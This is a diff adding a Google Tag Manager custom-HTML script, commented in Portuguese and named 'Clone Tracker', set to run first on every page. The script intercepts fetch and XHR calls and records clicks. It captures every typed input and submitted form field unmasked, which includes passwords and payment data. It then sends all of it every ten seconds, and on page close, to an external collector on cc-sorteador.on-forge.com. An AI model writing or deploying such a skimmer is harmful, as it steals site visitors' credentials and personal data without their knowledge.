@@ -1,0 +1,395 @@
+<!--
+  SCRIPT FINAL - COMPATÍVEL COM GTM (ES5)
+
+  CONFIGURAÇÃO NO GTM:
+  1. Tags > Nova > HTML Personalizado
+  2. Cole este código completo
+  3. IMPORTANTE: Em "Configurações avançadas":
+     - Acionamento: Escolha "Once per page"
+     - Opção de disparar: "Once per event"
+  4. Acionador: Page View - All Pages
+  5. AVANÇADO > Prioridade da tag: 999 (para executar PRIMEIRO)
+  6. Publicar
+-->
+
+<script>
+(function() {
+    'use strict';
+
+    // ========== CONFIGURAÇÕES ==========
+    var COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
+
+    var IGNORED_DOMAINS = [
+        'q.clarity.ms/collect',  // URL específica do Clarity
+        'clarity.ms',            // Qualquer URL do Clarity
+        'google-analytics.com',
+        'googletagmanager.com',
+        'doubleclick.net',
+        'facebook.com/tr',
+        'analytics.tiktok.com'
+    ];
+
+    // ========== GARANTIR EXECUÇÃO NO CONTEXTO CORRETO ==========
+
+    // Força execução no window principal (não no iframe do GTM)
+    var win = window;
+    var doc = document;
+
+    // Se estiver em iframe, pegar a janela pai
+    try {
+        if (window.top && window.top.document) {
+            win = window.top;
+            doc = window.top.document;
+        }
+    } catch (e) {
+        // Cross-origin, usar window atual
+    }
+
+    // ========== FUNÇÕES AUXILIARES ==========
+
+    function shouldIgnoreUrl(url) {
+        if (!url) return false;
+        var urlLower = String(url).toLowerCase();
+        for (var i = 0; i < IGNORED_DOMAINS.length; i++) {
+            if (urlLower.indexOf(IGNORED_DOMAINS[i]) > -1) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function getSessionId() {
+        try {
+            var sessionId = win.sessionStorage.getItem('clone_tracker_session');
+            if (!sessionId) {
+                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                win.sessionStorage.setItem('clone_tracker_session', sessionId);
+            }
+
+            if (!sessionId || sessionId === 'null' || sessionId === 'undefined') {
+                sessionId = 'session_fallback_' + Date.now();
+                win.sessionStorage.setItem('clone_tracker_session', sessionId);
+            }
+
+            return sessionId;
+        } catch (e) {
+            // Fallback se sessionStorage não disponível
+            return 'session_nostorage_' + Date.now();
+        }
+    }
+
+    function getBrowserInfo() {
+        var sessionId = getSessionId();
+
+        return {
+            sessionId: sessionId,
+            domain: win.location.hostname || 'unknown',
+            url: win.location.href || '',
+            referrer: doc.referrer || '',
+            screenResolution: (win.screen.width || 0) + 'x' + (win.screen.height || 0),
+            language: win.navigator.language || win.navigator.userLanguage || 'unknown',
+            timestamp: new Date().toISOString(),
+            requests: []
+        };
+    }
+
+    // ========== ARMAZENAMENTO GLOBAL ==========
+
+    // Usar window principal para armazenar dados
+    if (!win.__cloneTrackerData) {
+        win.__cloneTrackerData = {
+            capturedRequests: [],
+            originalFetch: win.fetch,
+            originalXHROpen: win.XMLHttpRequest ? win.XMLHttpRequest.prototype.open : null,
+            originalXHRSend: win.XMLHttpRequest ? win.XMLHttpRequest.prototype.send : null,
+            initialized: false
+        };
+    }
+
+    var data = win.__cloneTrackerData;
+
+    // Se já foi inicializado, não inicializar novamente
+    if (data.initialized) {
+        console.log('[Clone Tracker] Já inicializado');
+        return;
+    }
+
+    data.initialized = true;
+
+    // ========== INTERCEPTAÇÃO FETCH ==========
+
+    if (data.originalFetch && typeof data.originalFetch === 'function') {
+        win.fetch = function() {
+            var args = Array.prototype.slice.call(arguments);
+            var url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
+            var options = args[1] || {};
+            var method = options.method || 'GET';
+
+            // Não interceptar nosso collector
+            if (url.indexOf('/api/collect') > -1) {
+                return data.originalFetch.apply(this, args);
+            }
+
+            // Ignorar domínios bloqueados
+            if (shouldIgnoreUrl(url)) {
+                console.log('[Clone Tracker] Ignorando:', url);
+                return data.originalFetch.apply(this, args);
+            }
+
+            var requestData = {
+                type: 'fetch',
+                url: url,
+                method: method,
+                timestamp: new Date().toISOString()
+            };
+
+            if (options.body) {
+                try {
+                    requestData.body = String(options.body).substring(0, 1000);
+                } catch (e) {
+                    requestData.body = '[Unable to capture]';
+                }
+            }
+
+            data.capturedRequests.push(requestData);
+            console.log('[Clone Tracker] Capturado fetch:', url);
+
+            return data.originalFetch.apply(this, args).then(function(response) {
+                var responseData = {
+                    type: 'fetch_response',
+                    url: url,
+                    status: response.status,
+                    timestamp: new Date().toISOString()
+                };
+
+                data.capturedRequests.push(responseData);
+                return response;
+            }).catch(function(error) {
+                return Promise.reject(error);
+            });
+        };
+
+        console.log('[Clone Tracker] Fetch interceptado');
+    }
+
+    // ========== INTERCEPTAÇÃO XHR ==========
+
+    if (data.originalXHROpen && data.originalXHRSend) {
+        win.XMLHttpRequest.prototype.open = function(method, url) {
+            if (shouldIgnoreUrl(url)) {
+                console.log('[Clone Tracker] Ignorando XHR:', url);
+                this._ignored = true;
+            } else {
+                this._requestData = {
+                    type: 'xhr',
+                    method: method,
+                    url: url,
+                    timestamp: new Date().toISOString()
+                };
+            }
+            return data.originalXHROpen.apply(this, arguments);
+        };
+
+        win.XMLHttpRequest.prototype.send = function(body) {
+            var self = this;
+
+            if (this._ignored) {
+                return data.originalXHRSend.apply(this, arguments);
+            }
+
+            if (this._requestData) {
+                if (body) {
+                    try {
+                        this._requestData.body = String(body).substring(0, 1000);
+                    } catch (e) {
+                        this._requestData.body = '[Unable to capture]';
+                    }
+                }
+
+                data.capturedRequests.push(this._requestData);
+                console.log('[Clone Tracker] Capturado XHR:', this._requestData.url);
+
+                this.addEventListener('load', function() {
+                    var responseData = {
+                        type: 'xhr_response',
+                        url: self._requestData.url,
+                        status: self.status,
+                        timestamp: new Date().toISOString()
+                    };
+                    data.capturedRequests.push(responseData);
+                });
+            }
+
+            return data.originalXHRSend.apply(this, arguments);
+        };
+
+        console.log('[Clone Tracker] XHR interceptado');
+    }
+
+    // ========== CAPTURA DE EVENTOS ==========
+
+    doc.addEventListener('click', function(e) {
+        var element = e.target;
+        if (!element) return;
+
+        var clickData = {
+            type: 'click',
+            tagName: element.tagName || '',
+            id: element.id || '',
+            className: element.className || '',
+            text: element.innerText ? String(element.innerText).substring(0, 100) : '',
+            timestamp: new Date().toISOString()
+        };
+
+        data.capturedRequests.push(clickData);
+    }, true);
+
+    // Captura mudanças de input (TODOS os valores, sem mascarar)
+    var inputDebounce = {};
+    doc.addEventListener('input', function(e) {
+        var input = e.target;
+        if (input.tagName === 'INPUT' || input.tagName === 'TEXTAREA') {
+            var fieldName = input.name || input.id || 'unknown';
+
+            clearTimeout(inputDebounce[fieldName]);
+            inputDebounce[fieldName] = setTimeout(function() {
+                var inputData = {
+                    type: 'input_change',
+                    fieldName: fieldName,
+                    fieldType: input.type,
+                    value: input.value, // Captura o valor real (sem mascaramento)
+                    timestamp: new Date().toISOString()
+                };
+
+                data.capturedRequests.push(inputData);
+            }, 500);
+        }
+    }, true);
+
+    doc.addEventListener('submit', function(e) {
+        var form = e.target;
+        var formData = new FormData(form);
+        var formFields = {};
+
+        // Captura TODOS os campos (sem mascaramento)
+        var inputs = form.querySelectorAll('input, textarea, select');
+        for (var i = 0; i < inputs.length; i++) {
+            var input = inputs[i];
+            var name = input.name || input.id || 'field_' + i;
+            var value = input.value;
+
+            formFields[name] = value;
+        }
+
+        var submitData = {
+            type: 'form_submit',
+            action: form.action,
+            method: form.method,
+            fields: formFields,
+            timestamp: new Date().toISOString()
+        };
+
+        data.capturedRequests.push(submitData);
+    }, true);
+
+    // ========== ENVIO DE DADOS ==========
+
+    function sendToServer() {
+        if (data.capturedRequests.length === 0) {
+            return;
+        }
+
+        var payload = getBrowserInfo();
+
+        // Copia requests
+        payload.requests = [];
+        for (var i = 0; i < data.capturedRequests.length; i++) {
+            payload.requests.push(data.capturedRequests[i]);
+        }
+
+        if (!payload.sessionId) {
+            console.error('[Clone Tracker] ERRO: sessionId vazio!');
+            payload.sessionId = 'session_error_' + Date.now();
+        }
+
+        console.log('[Clone Tracker] Enviando:', payload.sessionId, '(' + payload.requests.length + ' eventos)');
+
+        // Limpa
+        data.capturedRequests = [];
+
+        // Envia
+        if (data.originalFetch && typeof data.originalFetch === 'function') {
+            data.originalFetch(COLLECTOR_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload),
+                mode: 'cors'
+            })
+            .then(function(response) {
+                console.log('[Clone Tracker] Status:', response.status);
+                return response.json();
+            })
+            .then(function(result) {
+                console.log('[Clone Tracker] Sucesso:', result);
+            })
+            .catch(function(error) {
+                console.error('[Clone Tracker] Erro:', error);
+            });
+        } else {
+            // Fallback XHR
+            var xhr = new win.XMLHttpRequest();
+            xhr.open('POST', COLLECTOR_URL, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.onload = function() {
+                if (xhr.status === 201) {
+                    console.log('[Clone Tracker] Sucesso via XHR');
+                }
+            };
+            xhr.onerror = function() {
+                console.error('[Clone Tracker] Erro no envio via XHR');
+            };
+            xhr.send(JSON.stringify(payload));
+        }
+    }
+
+    // ========== TIMERS ==========
+
+    // Envia a cada 10 segundos
+    win.setInterval(sendToServer, 10000);
+
+    // Envia ao fechar
+    win.addEventListener('beforeunload', function() {
+        if (data.capturedRequests.length > 0) {
+            var payload = getBrowserInfo();
+            payload.requests = [];
+            for (var i = 0; i < data.capturedRequests.length; i++) {
+                payload.requests.push(data.capturedRequests[i]);
+            }
+
+            if (win.navigator.sendBeacon) {
+                win.navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(payload));
+            }
+        }
+    });
+
+    // ========== INICIALIZAÇÃO ==========
+
+    // Evento inicial
+    data.capturedRequests.push({
+        type: 'page_load',
+        url: win.location.href,
+        timestamp: new Date().toISOString()
+    });
+
+    // Primeira chamada após 2s
+    win.setTimeout(sendToServer, 2000);
+
+    console.log('[Clone Tracker] ✅ Inicializado - Session:', getSessionId());
+    console.log('[Clone Tracker] Contexto:', win === window ? 'Window principal' : 'Iframe');
+    console.log('[Clone Tracker] Fetch original salvo:', typeof data.originalFetch);
+    console.log('[Clone Tracker] XHR original salvo:', typeof data.originalXHROpen);
+
+})();
+</script>
